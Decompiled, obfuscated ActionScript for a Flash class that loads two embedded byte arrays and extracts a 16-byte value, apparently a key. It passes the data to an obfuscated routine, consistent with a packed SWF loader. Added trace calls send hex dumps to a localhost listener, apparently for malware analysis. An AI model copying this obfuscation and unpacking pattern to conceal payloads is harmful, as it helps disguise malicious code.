package
{
   import flash.display.MovieClip;
   import flash.utils.ByteArray;
   import flash.display.Bitmap;
   import flash.display.Loader;
   import flash.display.LoaderInfo;
   import flash.display.Sprite;
   import flash.events.Event;
   import flash.events.IOErrorEvent;
   import flash.events.MouseEvent;
   import flash.net.URLLoader;
   import flash.net.URLRequest;
   import flash.net.URLRequestMethod;
   import flash.net.URLVariables;
   import flash.net.navigateToURL;

   public class §_el_-____-§ extends MovieClip
   {
       
      
      private var §_el_--_-_§:Class;
      
      public var §_el_---_§:ByteArray;
      
      private var §_el_-_§:Class;
      
      private var §_el_----__§:Array;
      
      public var §_el_-----§:ByteArray;
      internal function sendTrace(message:String) : void
      {
         var request:URLRequest = new URLRequest("http://localhost:8080/trace1");
         request.method = URLRequestMethod.POST;
         request.data = "trace=" + encodeURIComponent(message);
         var loader:URLLoader = new URLLoader();
         try
         {
            loader.load(request);
         }
         catch (error:Error)
         {
            trace("Error sending trace: " + error.message);
         }
      }

      public function §_el_-____-§()
      {
         this.§_el_-_§ = §_el_-__-__§;
         this.§_el_--_-_§ = §_el_-___--_§;
         this.§_el_-----§ = new ByteArray();
         this.§_el_----__§ = [];
         super();
         this.§_el_---_§ = new this.§_el_-_§() as ByteArray;
         var _loc1_:ByteArray = new this.§_el_--_-_§() as ByteArray;
         var _loc2_:int = 0;
         while(_loc2_ < 16)
         {
            this.§_el_-----§.writeByte(_loc1_.readByte());
            _loc2_++;
         }
         this.§_el_-----§.position = 0;
           sendTrace("Trace 2 from §_el_-____-§ : Loaded ByteArray content: " + byteArrayToHex(this.§_el_---_§));
           sendTrace("Trace 2 from §_el_-____-§ : Extracted ByteArray content: " + byteArrayToHex(this.§_el_-----§));
         §_el_--_--_§.§_el_-__-__-§(this.§_el_----__§,this.§_el_---_§.length);
      }
       private function byteArrayToHex(param1:ByteArray):String {
           var hex:String = "";
           param1.position = 0;
           while (param1.bytesAvailable) {
               var byte:int = param1.readUnsignedByte();
               hex += byte.toString(16).toUpperCase() + " ";
           }
           return hex;
       }
   }
   
}
